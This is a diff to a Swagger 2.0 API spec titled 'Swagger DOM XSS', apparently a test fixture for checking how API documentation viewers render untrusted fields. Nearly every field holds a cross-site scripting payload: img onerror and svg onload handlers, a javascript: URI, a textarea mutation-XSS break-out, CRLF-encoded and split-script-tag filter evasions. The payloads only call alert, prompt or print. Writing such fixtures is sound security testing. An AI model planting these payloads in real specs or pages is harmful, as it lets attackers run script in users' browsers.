@@ -1,7 +1,7 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: <img src=x onerror="alert('XSS')"></input><input><h2>XSS|
+  description: <img src=x onerror="alert('XSS')"></input><input onfocus=console.log(69)><h2>XSS|
     <mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
 
   termsOfService: "javascript:prompt()"
@@ -37,7 +37,7 @@ paths:
 
           format: int64
           in: path
-          name: photoUrls<script>alert(1)</script>
+          name: photoUrls"<script>alert(1)</script>
           required: true
           type: integer
       responses:
@@ -51,14 +51,14 @@ paths:
       parameters:
         - description: XSS<iframe>
           type: string
-          in: \"><svg/onload=alert()>
-          default: \"><img src=x onerror=prompt()>
+          in: \">%0a%0d%0a<svg/onload=alert()>
+          default: \"><img src=x onfocus=prompt()>
       responses:
         '200':
           description: No response was specified
       tags:
         - accounts
-      operationId: /xss.html\"><img>
+      operationId: /xss.html\"><img src=x onpointer=print()>
       summary: Finds groups by id
     post:
       parameters:
@@ -69,7 +69,7 @@ paths:
           type: string
       responses:
         '200':
-          description: No <h1>response was <scr<script>ipt>specified
+          description: No <h1>response was <scr<script>ipt>ipt<script>>specified
       tags:
         - accounts
       description: 'You cannot create an LDAP group with a POST.  '
